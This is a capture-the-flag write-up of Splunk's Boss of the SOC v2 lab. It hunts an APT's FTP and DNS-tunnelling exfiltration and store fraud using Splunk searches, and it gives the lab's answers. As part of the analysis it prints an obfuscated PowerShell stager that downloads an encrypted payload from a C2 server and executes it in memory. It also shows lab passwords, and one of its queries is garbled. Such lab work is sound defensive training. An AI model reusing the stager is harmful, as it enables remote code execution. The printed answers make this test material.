Since we know Taedonggang’s TTPs, I wanted to dig into the logs to understand the impact they had on Frothly – especially how many files were exfiltrated.

I started with exfiltration via `ftp.exe`. They managed to pull out over 700 `.pdf` files – most containing Frothly's beer recipes.

```spl
index=botsv2 sourcetype=stream:ftp AND 10.0.2.107 AND (160.153.91.7 OR 45.77.65.211) AND loadway=Upload AND earliest="08/24/2017:10:28:55"
| reverse
| table _time filename dest_ip
| rename filename as exfiltrated_filename
```

![pic44](assets/images/botsv2/pic44.png)

![pic45](assets/images/botsv2/pic45.png)

Looking at the `_time`, when `invoice.doc` was dropped on Billy Tun’s machine and the adversary began exfiltrating Frothly’s intellectual property, it was roughly a 2-hour window.

Next, I wanted to analyze UDP traffic, since the question mentions data exfiltrated via **UDP**.

One of the most common techniques for exfiltrating data over UDP is **DNS tunneling**. In this technique, adversaries manipulate DNS queries/responses to encode and transmit data between a compromised host and a C2 server. Since DNS traffic often goes unchecked through firewalls, it becomes a clever way to bypass detection.

Using the stream:udp sourcetype, I created a dashboard to get a bird's-eye view of UDP traffic in the environment.

![pic46](/assets/images/botsv2/pic46.png)

From the visualization, I noticed a suspicious spike in the dns app on `08/26/2017`, and a significant increase in `total_bytes_out`, raising a red flag for potential DNS exfiltration.

We already know that `hildegardsfarm.com` is associated with one of the malicious IPs used to exfiltrate Frothly’s intellectual property. So, it makes sense to start there:

```sql
index=botsv2 sourcetype=stream:dns AND earliest="08/24/2017:10:28:55" hildegardsfarm.com
```

Around 74,000 events came up - and 32,986 of them had NXDomain responses. That's a big red flag for DNS tunneling behavior.

![pic47](assets/images/botsv2/pic47.png)

Now, to answer the question:

We need to calculate the Shannon entropy score of the subdomains.

*(For anyone not familiar: entropy measures randomness. In cybersec, it helps flag suspicious patterns in strings or files. High entropy = more randomness = more likely to be obfuscated or encoded.)*

Here’s the Splunk search to extract suspicious subdomains, calculate entropy scores, and show the results:

```sql
index=botsv2 sourcetype=stream:dns AND earliest="08/24/2017:10:28:55" hildegardsfarm.com "query_type{}"=A AND query{}!="hildegardsfarm.com"
|mvexpand query{}
|dedup query{}
|rex field=query{} "(?<subdomain>^[^.]+)"
|eval chars=split(subdomain, "")
|mvexpand chars
|stats count by query{}, subdomain, chars
|eventstats sum(count) as total by query{}, subdomain
|eval p = count / total
|eval entropy = -p * log(p)/log(2)
|stats sum(entropy) as shannon_entropy by query{}, subdomain
|sort - shannon_entropy
```
![pic48](assets/images/botsv2/pic48.png)

To calculate the average, just add one more line `|stats avg(shannon_entropy)`

![pic49](assets/images/botsv2/pic49.png)

Base on [Splunk](https://www.splunk.com/en_us/blog/security/random-words-on-entropy-and-dns.html), an entropy value of **3.6** is considered quite high and is often used as an indicator for suspicious DNS related-activities.

**Victim**
- Frothly's Intelectuall Properties

**Malicous Contents**
- A lot subdomain with high entropy score query to `hildegardsfarm.com` - flagged as malicous domain from adversary

**Tactics / Techniques:**
- **Command and Control (TA0011)**
  - Application Layer Protocol: DNS (T1071.004) (*For exfiltration*)
  - Application Layer Protocol: fILE Transfer Protocol (T1071.002) (*For exfiltration*)
- **Collection (TA0009)**
  - Data from Local System (T1005)
  - Data from Network Shared Drive (T1039)
- **Exfiltration (TA0010)**
  - Exfiltration Over Alternative Protocol (T1048)
- **Impact (TA0040)**
  - Exfiltration Over C2 Channel (T1041)

> **ANSWER:** `3.6`
{: .prompt-info }

#### Question 38 (407): To maintain persistence in the Frothly network, Taedonggang APT configured several Scheduled Tasks to beacon back to their C2 server. What single webpage is most contacted by these Scheduled Tasks? Answer guidance: Remove the path and type a single value with an extension. Answer example: index.php or images.html

The picture has been cleared, Taedonggang APT' TTPs has been revealed, rest of the 400 series question is answer what the challenge ask.

```sql
index=botsv2 sourcetype=stream:tcp AND dest_ip=45.77.65.211 AND dest_port=443 AND earliest="08/24/2017:10:28:55" 
|table src_ip
|stats count by src_ip
|sort - count
```
![pic50](assets/images/botsv2/pic50.png)

`10.0.2.107` (Billy Tun's workstation)- is the IP Address has the most contacted to the C2 server. And we already tracked the malicious payload on his/her machine.

```shell
# Decrypts and executes a downloaded payload in memory
$K = [SysTem.TExt.ENcOdiNG]::ASCII.GetBYTes('389288edd78e8ea2f54946d3209b16b8');
$WC.HeaDeRS.Add("Cookie", "session=jknXpoa7pUA0lDBnYiQvU9unHg=");
$ser = 'https://45.77.65.211:443';
$t = '/login/process.php';
$DATA = $WC.DoWnLoAdDaTa($SEr $t);
$IV = $DATa[0..3];
$dATa = $DaTA[4..$daTa.LeNGtH];
- joiN[CHar[]](& $R $data ($IV $K)) | IEX
```

> **ANSWER:** `process.php`
{: .prompt-info }

#### Question 39 (408): The APT group Taedonggang is always building more infrastructure to attack future victims. Provide the IPV4 IP address of a Taedonggang controlled server that has a completely different first octet to other Taedonggang controlled infrastructure. Answer guidance: 4.4.4.4 has a different first octet than 8.4.4.4

So far, we've identified Taedonggang's infrastructure as including:
- `45.77.65.211` - used for C2 (command and control) and hosting payloads
- `160.153.91.7` - used for data exfiltration

This question is a bit tricky, and I had to use all the hints provided in the challenge. Splunk suggests focusing on SSL-related stubs to solve it.

That makes sense-attackers (and even regular users) often reuse the same behaviors or infrastructure. The SSL certificate fingerprint is a great way to track if any other hosts are using the same certificate.

I used the `stream:tcp` sourcetype and the IP address `45.77.65.211` (the C2 server for Empire agents) to extract SSL certificate details:

- **ssl_cert_md5:** 671DFE1D4F15C5A05F21DDB66D3B7815
- **ssl_cert_sha1:** 1ACB3A5AAA46FC13F788A448716F841168F82227
- **ssl_cert_sha256:** 18C13D226F7E39F45F22DA35ACC288A8AF6BFF23CA1D85B9A3FD3E36E52397D0
- **ssl_serialnumber:** 10285871634388831649

To track this certificate across the internet, I tried some OSINT platforms:
- [Shodan](https://www.shodan.io)
- [Censys](https://platform.censys.io/)

![pic51](assets/images/botsv2/pic51.png)

I had some luck with Censys, but unfortunately, there were no current hosts associated with this certificate-likely because the database has been updated or the certificate has been revoked.

After searching online, I found that other folks had solved this using the old Censys platform, but that version has since been replaced.

**In the end, I had to skip this question due to lack of available data.**

#### Question 40 (409): The Taedonggang group had several issues exfiltrating data. Determine how many bytes were successfully transferred in their final, mostly successful attempt to exfiltrate files via a method using TCP, using only the data available in Splunk logs. Use 1024 for byte conversion.

When investigating how Taedonggang exfiltrated Frothly's data, we saw they used both DNS tunneling and FTP.

To focus on FTP exfiltration, I searched for all `.pdf` files that were uploaded to Taedonggang's FTP servers:

```sql
index=botsv2 sourcetype=stream:ftp AND (160.153.91.7 OR 45.77.65.211) AND loadway=Upload AND earliest="08/24/2017:10:28:55" AND successfully
| table _time filename dest_ip
| rename filename as exfiltrated_filename
```

![pic52](assets/images/botsv2/pic52.png)

After filtering out Billy Tun's workstation IP (`10.0.2.107`), I noticed a `.kdbx` (KeePass) file was exfiltrated from Kevin's machine (`10.0.2.109`). Interesting, but let's get back to the main question.

The last file they tried to exfiltrate was `topsecretyeast.pdf`. Looking at the log details:

```json
"reply_content": "Connecting to port 46991\r\nError during read from data connection\r\nTransfer aborted\r\n"
```

This means the transfer failed-the file was not successfully exfiltrated.

For comparison, a successful transfer (like `"Old Bavarian Lager.pdf"`) shows:

```log
reply_content: Connecting to port 13867
File successfully transferred
13.689 seconds (measured here), 1.24 Mbytes per second
```

From this, I estimated the file size was about 16 MB. But the question asks for the **total bytes of all files that were exfiltrated successfully**.

So, I refined my search to only include successful transfers:

```sql
index=botsv2 sourcetype=stream:ftp AND (160.153.91.7 OR 45.77.65.211) AND loadway=Upload AND earliest="08/24/2017:10:28:55" AND reply_content=*success*
| reverse
| table _time filename dest_ip reply_content
| rename filename as exfiltrated_filename
```

![pic53](assets/images/botsv2/pic53.png)
_About 707 files were transferred successfully._

There were three separate `flow_id` values, and the last file was associated with `flow_id` = `f4703a87-9b70-43d1-af73-344db697a9bf`.

To calculate the file sizes, I extracted the necessary fields using regex:

```sql
index=botsv2 sourcetype=stream:ftp (160.153.91.7 OR 45.77.65.211) loadway=Upload reply_content="*success*" AND earliest="08/24/2017:10:28:55" AND flow_id="f4703a87-9b70-43d1-af73-344db697a9bf"
| rex field=reply_content "(?P<seconds>[0-9.]+) seconds.*?, (?P<speed>[0-9.]+) (?P<unit>[KM])bytes per second"
| eval multiplier=case(unit=="K", 1024, unit=="M", 1048576, true(), 1)
| eval file_size_bytes=round(seconds * speed * multiplier) 
| table _time, filename, dest_ip, seconds, speed, unit, file_size_bytes
```

![pic54](assets/images/botsv2/pic54.png)

Adding up all the file sizes with `|stats sum(file_size_bytes)`, I got `1395020740` bytes, but this wasn't the correct answer.

After checking with the admin user, the correct answer should be `1394847505` bytes. There was a discrepancy of `173235` bytes, but searching for that file size by using `|search file_size_bytes = 173235` returned no results.

### Series 500

#### Question 41 (500): Individual clicks made by a user when interacting with a website are associated with each other using session identifiers. You can find session identifiers in the stream:http sourcetype. The Frothly store website session identifier is found in one of the stream:http fields and does not change throughout the user session. What session identifier is assigned to dberry398@mail.com when visiting the Frothly store for the very first time? Answer guidance: Provide the value of the field, not the field name.

Even though they suggested using `sourcetype=stream:http`, I wasn’t sure if that was the only relevant sourcetype for this question. So, I started with a quick overview using `|metasearch` to identify where the events came from:

```sql
|metasearch index=botsv2 sourcetype=* dberry398
```

![pic56](assets/images/botsv2/pic56.png)
_metasearch is really helpful when you need to quickly identify relevant sourcetypes_

From this, we quickly saw that there were only 3 events, all from `stream:http`. That made it easier to focus on identifying the session identifier.

From OWASP about [Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html#:~:text=In%20order%20to%20keep%20the%20authenticated%20state%20and,session%20%28it%20is%20sent%20on%20every%20HTTP%20request%29.), session IDs can reveal useful information:

> "The session ID names used by the most common web application development frameworks can be easily fingerprinted, such as PHPSESSID (PHP), JSESSIONID (J2EE), CFID & CFTOKEN (ColdFusion), ASP.NET_SessionId (ASP .NET), etc. Therefore, the session ID name can disclose the technologies and programming languages used by the web application."

> "There are multiple mechanisms available in HTTP to maintain session state within web applications, such as cookies (standard HTTP header), URL parameters (URL rewriting – RFC2396), URL arguments on GET requests, body arguments on POST requests, such as hidden form fields (HTML forms), or proprietary HTTP headers."

![pic57](assets/images/botsv2/pic57.png)

As expected, the `cookie` field included a PHPSESSID.

Here’s the search I used to extract the session ID:

```sql
index=botsv2 sourcetype=stream:http AND dberry398
|reverse
|search PHPSESSID
|rex "PHPSESSID=(?<phpsessid>[a-zA-Z0-9]+)"
|table  _time phpsessid cookie
```

![pic58](/assets/images/botsv2/pic58.png)

Using a simple regex, I extracted the PHPSESSID values. I found three different session IDs:
- r51ctj1efg8bo7lacaq399nci5 (This session ID is the very first appeared within the logs)
- o6fc5a2rdoufmb8en8bqvfbav2
- mlhg4l49hi8hn93b2abtr75j42

At first, I thought the question was asking for the value of the session ID, but it turned out they were looking for the identifier-meaning the component or mechanism used to track the session.

After digging deeper, I discovered that the website was running on Magento 2, an open-source eCommerce platform built with PHP. Magento has a security feature called a form key (or nonce), which is used to prevent Cross-Site Request Forgery (CSRF) attacks.

>"For each session, a unique form key is generated and embedded into the form as an invisible field. And the same is matched with the user’s request to confirm legitimacy of the request." (Source:https://meetanshi.com/blog/invalid-form-key-please-refresh-the-page-in-magento-2/)

I refined my search to extract the form key:

```sql
index=botsv2 sourcetype=stream:http dberry398 
|reverse
|search PHPSESSID
|rex "PHPSESSID=(?<phpsessid>[a-zA-Z0-9]+)"
|rex "form_key=(?<key>[a-zA-Z0-9]+)"
|table  _time phpsessid key cookie
```

![pic59](assets/images/botsv2/pic59.png)
_hmm, is there any abnormal in this logs?_

There were three different session IDs, but only one form key. That raised a red flag-possibly indicating session hijacking or suspicious reuse of form keys across sessions. Definitely worth investigating further.

**Victim**
- Frothly eCommerce website - `store.froth.ly`
- `172.31.7.2`

**Suspicious actor**
- `dberry398@mail.com`
- `74.130.56.117`

> ANSWER: `lwh9Ql7oUbnJUqxR`
{: .prompt-info }

#### Question 42 (501): How many unique user ids are associated with a grand total order of $1000 or more?

This question felt pretty broad and didn’t seem directly related to the previous one. However, since we already had the suspicious IP address from before, I figured-why not look into it a bit more and see if anything interesting turns up?

```sql
index=botsv2 sourcetype=stream:http 74.130.56.117 
|fieldsummary 
|fields field values value 
|rex field=values max_match=0 "\"value\":\"(?<value>[^\"]+)\""
|where isnotnull(value)
|fields field value
```

This search helped me quickly identify all the field values associated with the events. I actually have this saved as a macro (you can check it in my BOTSv1 write-up). It’s a handy way to scan for valuable fields.

Some of the fields catched my eyes immediately as potentially interesting.

**Form Data** - `form_data` field included sensitive information like usernames, passwords, and email addresses of customers.

![pic60](/assets/images/botsv2/pic60.png)

**HTTP Referrer** - `http_referer` field gave insight into browsing paths. One particular referrer caught my attention:

![pic61](/assets/images/botsv2/pic61.png)

...

`http://store.froth.ly/magento2/checkout/` - this looked important. In most eCommerce platforms, the `/checkout/` path is related to payment processing, and that’s where customers typically submit payment info. 

I wanted to narrow it down to POST requests related to checkout-because that’s when users actually send their data (like payment details) to the server.

```sql
index=botsv2 sourcetype=stream:http 74.130.56.117 AND http_referrer="http://store.froth.ly/magento2/checkout/" AND http_method=POST
|reverse
```
This returned only 8 events, so I manually inspected them to see what kind of information they held.

![pic62](assets/images/botsv2/pic62.png)

There were 2 fields contains some interesting information:
- `dest_content`: contains payment details information. 
- `src_content`: contains shipping addresses.

Since this data looked useful, I built a more refined Splunk search to extract entries where the grand total was ≥ $1000.

```sql
index=botsv2 sourcetype=stream:http http_referrer="http://store.froth.ly/magento2/checkout/" http_method=POST AND dest_content=*payment* 
|reverse
|spath input=dest_content path=totals.grand_total output=grandtotalmoney
|spath input=src_content path=addressInformation.shipping_address.firstname output=customer_firstname
|spath input=src_content path=addressInformation.shipping_address.lastname output=customer_lastname
|where grandtotalmoney >= 1000 
|rex "form_key=(?<key>[a-zA-Z0-9]+)"
|rex "PHPSESSID=(?<phpsessid>[a-zA-Z0-9]+)"
|table _time customer_firstname customer_lastname grandtotalmoney key phpsessid
```
![pic64](assets/images/botsv2/pic64.png)

From the 8 POST events returned back, there were 2 matched the criteria of a grand total ≥ $1000 tied to a single user.

> ANSWER: `7`
{: .prompt-info }

#### Question 43 (502): Which user, identified by their email address, edited their profile before placing an order over $1000 in the same clickstream? Answer guidance: Provide the user ID, not other values found from the profile edit, such as name.

We already know the `form_key` values associated with users who placed beer orders over $1000. So, let's extract all those keys and look for interesting fields-particularly `http_referrer` and `form_data`, as mentioned earlier.

```sql
index=botsv2 sourcetype=stream:http 
AND (yjB8uDMr9vRpbibM OR 4wHUQN8O31Qt0Qth OR 9opxLVZ5zgicn5kx OR SqxyMqO5xJVNB865 OR QHHVI6brFPuLxVUk OR 0w3UxbR9QnnI5OHw OR 0XnzRTpeOVy9HD1Z OR ZDd2VGcWWKcKM95o) 
|fieldsummary 
|fields field values value 
|rex field=values max_match=0 "\"value\":\"(?<value>[^\"]+)\""
|where isnotnull(value)
|fields field value
```

![pic65](assets/images/botsv2/pic65.png)
_Form data contains valuable information such as usernames and passwords_

![pic66](assets/images/botsv2/pic66.png)
_There are some new path we didn't explore in the previous questions_

The most interesting path is: `http://store.froth.ly/magento2/customer/account/edit/`. Let’s check if there’s anything noteworthy there:

```sql
index=botsv2index=botsv2 sourcetype=stream:http AND http_referrer="http://store.froth.ly/magento2/customer/account/edit/" AND http_method=POST
|reverse 
|table _time c_ip src_content sourcetype=stream:http AND http_referrer="http://store.froth.ly/magento2/customer/account/edit/" AND http_method=POST
```

![pic67](assets/images/botsv2/pic67.png)

There were two events from a single IP address, associated with the user Brigid Kildcare:

```yaml
------WebKitFormBoundaryNmHoU2HLpBYL8dFD
Content-Disposition: form-data; name="change_email"

1
------WebKitFormBoundaryNmHoU2HLpBYL8dFD
Content-Disposition: form-data; name="email"

bkildcare@yahoo.com
```

It appears this user changed their email address. From the `form_data` values in the screenshot above, another email associated with this user is: `bkildcare@yandex.com`.

Let's look at the timeline between these two email values:

```sql
index=botsv2 sourcetype=stream:http AND 94.161.231.191 AND http_method=POST AND @
|reverse
|table _time form_data
```

![pic68](assets/images/botsv2/pic68.png)
_The email update occurred approximately 2 minutes before the order was placed._

| _time                   | c_ip           | customer_firstname | customer_lastname | grandtotalmoney |
| ----------------------- | -------------- | ------------------ | ----------------- | --------------- |
| 2017-08-05 07:46:03.280 | 94.161.231.191 | Brigid             | Kildcare          | 1552            |

The order was submitted at 07:46:03.280, which is about 2 minutes and 30 seconds after the email change event.

> ANSWER: `bkildcare@yandex.com`
{: .prompt-info }

#### Question 44 (503): What street address was used most often as the shipping address across multiple accounts, when the billing address does not match the shipping address? Answer example: 123 Sesame St

In previous questions, we gathered a lot of information about payments and shipping addresses-particularly while identifying orders with a grand total of $1000 or more. Building upon that search, I extracted relevant data to determine which shipping address was used most frequently across different accounts, where the billing address does not match the shipping address.

```sql
index=botsv2 sourcetype=stream:http http_referrer="http://store.froth.ly/magento2/checkout/" http_method=POST AND dest_content=*payment* 
|reverse
|spath input=dest_content path=totals.grand_total output=grandtotalmoney
|spath input=src_content path=addressInformation.shipping_address.firstname output=customer_firstname
|spath input=src_content path=addressInformation.shipping_address.lastname output=customer_lastname
|spath input=src_content path=addressInformation.shipping_address.street{} output=address_street
|spath input=src_content path=addressInformation.billing_address.street{} output=billing_street
|table _time c_ip customer_firstname customer_lastname  address_street billing_street
```

![pic69](assets/images/botsv2/pic69.png)

Out of 148 orders, the following three street addresses were used most frequently as shipping addresses:
- 1654 Virginia Ave (126 events) across 106 unique IP addresses
- 200 Franklin St (5 events) across 5 unique IP addresses
- 3876 Highland Avenue (3 events) across 3 unique IP addresses

At first, it seemed like `1654 Virginia Ave` was the correct answer due to its frequency. However, that turned out to be incorrect-which was surprising for me.

Upon closer inspection, I noticed that all of these events had matching billing and shipping addresses, which contradicted the question's key condition: **when the billing address does not match the shipping address**.

To clarify this, I checked the hint provided:

> "Users who have made a purchase in the past automatically have previous shipping destinations displayed in their browser, which can be found in the stream:http field src_content. After the user changes their shipping address, you will see a different value displayed for the shipping address. If you are fixated on the first shipping address found within a stream, you are going to be stuck. Take a look in this url for the user-modified shipping address during the payment process: http://store.froth.ly/magento2/rest/default/V1/carts/mine/payment-information"

From that clue, I realized there’s a separate uri_path used when users modify their billing or shipping address during checkout. So I queried that separately:

```sql
index=botsv2 sourcetype=stream:http payment-information http_method=POST
|reverse
|spath input=src_content path=billingAddress.street{} output=billing_street
|spath input=src_content path=billingAddress.firstname output=firstname
|spath input=src_content path=billingAddress.lastname output=lastname
|rename billing_street as old_street
|table _time c_ip old_street firstname lastname
```

![pic70](assets/images/botsv2/pic70.png)

Then, by joining this data with the original query containing updated shipping information, I was able to identify addresses where the shipping and billing data did not match-during the actual payment submission.

```sql
index=botsv2 sourcetype=stream:http payment-information http_method=POST
|reverse
|spath input=src_content path=billingAddress.street{} output=billing_street
|spath input=src_content path=billingAddress.firstname output=firstname
|spath input=src_content path=billingAddress.lastname output=lastname
|rename billing_street as old_street
|table _time c_ip old_street firstname lastname
|join type=inner c_ip [
search index=botsv2 sourcetype=stream:http http_referrer="http://store.froth.ly/magento2/checkout/" http_method=POST AND dest_content=*payment* 
|reverse
|spath input=dest_content path=totals.grand_total output=grandtotalmoney
|spath input=src_content path=addressInformation.shipping_address.firstname output=customer_firstname
|spath input=src_content path=addressInformation.shipping_address.lastname output=customer_lastname
|spath input=src_content path=addressInformation.shipping_address.street{} output=address_street
|spath input=src_content path=addressInformation.billing_address.street{} output=billing_street
|rename billing_street as new_street
|table _time c_ip customer_firstname customer_lastname new_street
]
```

![pic71](assets/images/botsv2/pic71.png)

This revealed the correct answer: the most commonly used shipping address, where the billing address did not match, was `200 Franklin St`

> ANSWER: `200 Franklin St`
{: .prompt-info }

#### Question 45 (504): What is the domain name used in email addresses by someone creating multiple accounts on the Frothly store website (http://store.froth.ly) that appear to have machine-generated usernames?

To solve this question, I focused on identifying suspicious or machine-generated usernames used to create multiple accounts on the Frothly store. Since previous questions revealed that `http_referrer` contains useful contextual values, I revisited the following endpoints:
- "http://store.froth.ly/magento2/customer/account/login/"
- "http://store.froth.ly/magento2/customer/account/create/"

Started with the account creation endpoint, assuming that’s where new users register:

```sql
index=botsv2 sourcetype=stream:http AND http_method=POST AND http_referrer="http://store.froth.ly/magento2/customer/account/create/" AND http://store.froth.ly
|reverse 
|rex "password=(?<password>[^&]+)"
|rex "email=(?<email>[^&]+)"
|table _time c_ip email password
```

![pic2](assets/images/botsv2/pic72.png)

From this, I scanned through a sample of account registration data, but nothing interested. Emails and passwords looked legitimate, except for one suspicious entry using `linuxhack`.

Next, I moved to the login endpoint, which might prove more information:

```sql
index=botsv2 sourcetype=stream:http AND http_method=POST AND http_referrer="http://store.froth.ly/magento2/customer/account/login/" AND store.froth.ly
|rex "login\[username\]=(?<username>[^&]+)"
|rex "login\[password\]=(?<password>[^&]+)"
|rex field=username "(?<=@)(?<email_domain>[^@]+)$"
|table _time c_ip username email_domain password form_data
```

![pic73](assets/images/botsv2/pic73.png)

This dataset contained a number of logins with usernames that appeared to follow an alphabetic and consistent pattern-indicative of automation. 

By extracting just the domain portion of the email and aggregating by a bit of visualization (added `stats count by email_domain`), I identified that the domain `elude.in` was used 52 times-significantly more than common providers like `gmail.com`, which only appeared 29 times:

![pic74](assets/images/botsv2/pic74.png)


This made it clear that `elude.in` was likely used to create multiple, possibly automated, accounts.

> ANSWER: `elude.in`
{: .prompt-info }

#### Question 46 (505): Which user ID experienced the most logins to their account from different IP address and user agent combinations? Answer guidance: The user ID is an email address.

This question builds on the previous analysis by adding the `http_user_agent` field. The goal is to identify the user (email) who logged in from the most diverse set of IP addresses and user agents, which could indicate account sharing or compromise.

I began by returning to the login POST requests on the Frothly store:

```sql
index=botsv2 sourcetype=stream:http AND http_method=POST AND http_referrer="http://store.froth.ly/magento2/customer/account/login/" AND http://store.froth.ly
|reverse 
|rex "login\[username\]=(?<username>[^&]+)"
|rex "login\[password\]=(?<password>[^&]+)"
|rex field=username "(?<=@)(?<email_domain>[^@]+)$"
|table _time c_ip http_user_agent username email_domain password form_data
|stats count by http_user_agent username c_ip
```

![pic75](assets/images/botsv2/pic75.png)

This produced a dataset showing the combination of usernames, IP addresses, and user agents used in each login attempt. By inspecting this data, I was able to identify patterns of multiple logins across varying environments.

One user stood out clearly: Tom2014@msn.com
- Logged in from 5 unique IP addresses
- Using 5 different user agents

![pic76](assets/images/botsv2/pic76.png)

> ANSWER: `Tom2014@msn.com`
{: .prompt-info }

#### Question 47 (506): What is the most popular coupon code being used successfully on the site?
This question seemed to be unrelated to the previous login-based investigations, so I started fresh with a simple search focused on coupon usage:

```sql
index=botsv2 sourcetype=stream:http http_method!=GET AND coupon AND site=store.froth.ly
|reverse
```

> I used http_method!=GET to filter out noise from static content (like .js files) and focus on more meaningful HTTP requests like POST or PUT.

Upon reviewing the 126 returned events, some key indicators emerged:

- dest_content: `{"message":"Coupon code is not valid","trace":"#0 [internal function]: Magento\\Quote\\Model\\CouponManagement->set(146, 'FALL2017')\n#1` - included status of coupon code, i believe 'FALL2017' is the coupon code
- request: `PUT /magento2/rest/default/V1/carts/mine/coupons/FALL2017 HTTP/1.1` - The request path confirmed the coupon being applied.

I extracted the coupon code and response message with this search:

```sql
index=botsv2 sourcetype=stream:http http_method!=GET AND coupon AND site=store.froth.ly
|reverse
|rex field=dest_content "\"message\":\"(?<status_message>[^\"]+)\""
|rex field=dest_content "CouponManagement->set\(\d+, '(?<coupon_code>[^']+)'"
|table _time c_ip status_message coupon_code dest_content
```

![pic77](assets/images/botsv2/pic77.png)
_But — surprisingly — all coupon codes returned showed an invalid status_

To dig deeper, I pivoted to the exact API endpoint being used to apply coupons:

```sql
index=botsv2 sourcetype=stream:http AND uri_path="/magento2/rest/default/V1/carts/mine/coupons/*" AND http://store.froth.ly
```

![pic78](assets/images/botsv2/pic78.png)

Out of 126 total events, only 3 returned `HTTP 200 OK`, indicating a successful coupon application.

```sql
index=botsv2 sourcetype=stream:http AND uri_path="/magento2/rest/default/V1/carts/mine/coupons/*" AND http://store.froth.ly AND http_comment="HTTP/1.1 200 OK"
```
Looked at to events with sucessfull code, i found some helpful information: `request: PUT /magento2/rest/default/V1/carts/mine/coupons/WINTER2017 HTTP/1.1`

So there were more coupon code in this events.

```sql
index=botsv2 sourcetype=stream:http AND uri_path="/magento2/rest/default/V1/carts/mine/coupons/*" AND http://store.froth.ly AND http_comment="HTTP/1.1 200 OK"
|table _time c_ip request dest_content
```

| _time                   | c_ip            | request                                                              | dest_content |
| ----------------------- | --------------- | -------------------------------------------------------------------- | ------------ |
| 2017-08-21 19:18:49.406 | 106.17.47.7     | PUT /magento2/rest/default/V1/carts/mine/coupons/WINTER2017 HTTP/1.1 | true         |
| 2017-08-20 20:01:02.406 | 109.205.118.181 | PUT /magento2/rest/default/V1/carts/mine/coupons/WINTER2017 HTTP/1.1 | true         |
| 2017-08-19 21:19:49.406 | 71.75.173.193   | PUT /magento2/rest/default/V1/carts/mine/coupons/WINTER2017 HTTP/1.1 | true         |

So we identified the coupon that used successfully for discount in Frothy's Store

> ANSWER: WINTER2017
{: .prompt-info }

#### Question 48 (507): Several user accounts sharing a common password is usually a precursor to undesirable scenario orchestrated by a fraudster. Which password is being seen most often across users logging into http://store.froth.ly.

This question builds upon our previous analysis of login activity. I reused the same base search to extract usernames and passwords from login attempts:

```sql
index=botsv2 sourcetype=stream:http AND http_method=POST AND http_referrer="http://store.froth.ly/magento2/customer/account/login/" AND http://store.froth.ly
|reverse 
|rex "login\[username\]=(?<username>[^&]+)"
|rex "login\[password\]=(?<password>[^&]+)"
|rex field=username "(?<=@)(?<email_domain>[^@]+)$"
|table _time c_ip username email_domain password form_data
|stats count by password
|sort - password
```

This revealed the top 3 most commonly used passwords:
- `2600` - used 42 times
- `MinisterOfReality` - used 20 times
- `HardwareBasedEasterEggs2017` - used 19 times

While `2600` and `MinisterOfReality` appeared the most, further inspection revealed both were tied to single usernames or suspiciously invalid accounts.

Example - password: `2600`

![pic79](assets/images/botsv2/pic79.png)

Example - password: `MinisterOfReality`

![pic80](assets/images/botsv2/pic80.png)

In contrast, `HardwareBasedEasterEggs2017` associated with multiple users, and the same pattern in username.

![pic81](assets/images/botsv2/pic81.png)

Seems like this user was created multiple accounts to do some suspicious activities in Frothly's Store.

> ANSWER: `HardwareBasedEasterEggs2017`
{: .prompt-info }

#### Question 49 (508): Which HTML page was most clicked by users before landing on http://store.froth.ly/magento2/checkout/ on August 19th? Answer guidance: Use earliest=1503126000 and latest=1503212400 to identify August 19th. Answer example: http://store.froth.ly/magento2/bigbrew.html

This question is relatively straightforward. From earlier questions, we learned that HTTP GET requests are typically used to retrieve frontend site content, such as `.css`, `.js`, and `.html` files.

To identify which product page was accessed the most, I built a search that focuses on:
- HTTP GET requests
- Targeting the store.froth.ly domain
- With a http_referrer ending in .html
- Limited to a specific time range: earliest=1503126000 to latest=1503212400

```sql
index=botsv2 sourcetype=stream:http http_method=GET AND site=store.froth.ly AND http_referrer=*.html AND earliest=1503126000 AND latest=1503212400
|table http_referrer
|stats count by http_referrer
```

![pic82](assets/images/botsv2/pic82.png)

Among the pages, `http://store.froth.ly/magento2/mens-frothly-tee.html` received the highest number of hits, indicating it's the most visited product page during that period.

> ANSWER: `http://store.froth.ly/magento2/mens-frothly-tee.html`
{: .prompt-info }

#### Question 50 (509): Which HTTP user agent is associated with a fraudster who appears to be gaming the site by unsuccessfully testing multiple coupon codes?

In Question 47, we extracted coupon codes associated with failed submissions, indicated by error messages such as `"Coupon code is not valid."` Now, we’re shifting focus to identify which user agent appears to be systematically attempting coupon abuse.

To do this, I ran the following Splunk query to extract:
- HTTP requests that aren’t GET (to avoid static content),
- Contain the keyword coupon,
- Are sent to the store.froth.ly site,
- And extract relevant details such as the status message and coupon code

```sql
index=botsv2 sourcetype=stream:http http_method!=GET AND coupon AND site=store.froth.ly
|reverse
|rex field=dest_content "\"message\":\"(?<status_message>[^\"]+)\""
|rex field=dest_content "CouponManagement->set\(\d+, '(?<coupon_code>[^']+)'"
|table _time c_ip http_user_agent status_message coupon_code
```

Upon inspecting the results, one particular user agent stood out:

![pic83](assets/images/botsv2/pic83.png)

This user agent made a large number of coupon code attempts in a short period of time, often using random or non-standard capitalization patterns. In contrast, legitimate users typically submitted recognizable, all-uppercase coupon codes like `FALL2017` or `WINTER2017`.

The abnormal frequency and structure of coupon code attempts strongly suggest coupon code enumeration or gaming activity. 

> ANSWER: `Mozilla/5.0 (Windows NT 6.333; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.115 Safari/537.36`
{: .prompt-info}

### Recap and What's Next

#### Recap

That was quite a journey — we walked through a wide variety of security incidents, each offering a unique perspective and challenge:

- **Series 100** introduced us to **insider threat** scenarios.
- **Series 200** focused on **web application vulnerabilities** and attacks.
- **Series 300** simulated a **ransomware case** stemming from a malicious USB device.
- **Series 400** escalated into a **multi-stage kill chain** orchestrated by the **advanced persistent threat group**, Taedonggang.
- **Series 500** concluded with **abuse and misuse of the Frothly website**, showcasing how attackers manipulate legitimate features for suspicious activities.

Out of all, **Series 400** was the most captivating for me. It wasn’t just about finding a quick answer - it felt like conducting a **real-world security investigation**. I had to uncover the attacker’s TTPs (Tactics, Techniques, and Procedures), connect indicators, and pivot like a true analyst.

I found **Series 200 and 500** the most challenging:
- Series 200 tested my weaknesses in web application security.
- Series 500 required deep domain knowledge of how the web, accounts, and logs behave - a subtle but complex area.

#### What's Next

The next logical step: Boss of the SOC v3 - the latest publicly released version of this Splunk CTF challenge. I truly hope Splunk continues to release more datasets in the future, because BOTS is one of the most engaging and practical ways to learn threat hunting, log analysis, and real-world incident response using Splunk and other OSINT tools.

THANK YOU FOR GET ALONG WITH ME ! 

